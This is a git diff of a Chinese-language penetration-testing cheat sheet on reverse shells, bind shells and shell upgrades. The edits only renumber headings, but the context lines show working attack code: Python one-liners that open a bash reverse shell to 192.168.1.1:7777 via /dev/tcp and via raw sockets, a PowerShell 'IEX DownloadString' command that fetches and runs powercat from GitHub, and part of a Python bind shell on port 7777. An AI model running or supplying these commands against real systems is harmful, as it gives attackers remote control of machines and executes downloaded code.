@@ -2,7 +2,7 @@
 
 ## 0x01 反弹shell
 
-### Linux
+### 1. Linux
 
 等待反弹的shell会话主机：192.168.1.1:7777  
 #### bash
@@ -24,7 +24,7 @@ import os;os.system("bash -c 'bash -i >& /dev/tcp/192.168.1.1/7777 0>&1'")
 import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.1.1",7777));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);
 ```
 
-### Windows
+### 2. Windows
 #### powercat 
 https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1    
 ```
@@ -32,7 +32,7 @@ powershell -nop -exec bypass -c "IEX (New-Object System.Net.Webclient).DownloadS
 ```
 ## 0x02 正向shell
 
-### python on windows
+### 1. python on windows
 >监听在7777端口，可以通过nc连接
 ```python
 from socket import *
@@ -63,9 +63,9 @@ if __name__ == "__main__":
                 proc.stdin.flush()
         server.close()
 ```
-### python on linux
+### 2. python on linux
 >监听在7777端口，可以通过nc连接
-```
+```python
 from socket import *
 import subprocess
 import os, threading, sys, time
@@ -83,7 +83,7 @@ if __name__ == "__main__":
 
 ## 0x03 提升shell交互能力
 
-### Linux
+### 1. Linux
 #### python
 它可以执行命令su，以为他们是在一个合适的终端执行。要升级一个shell，只需运行以下命令：     
 ```
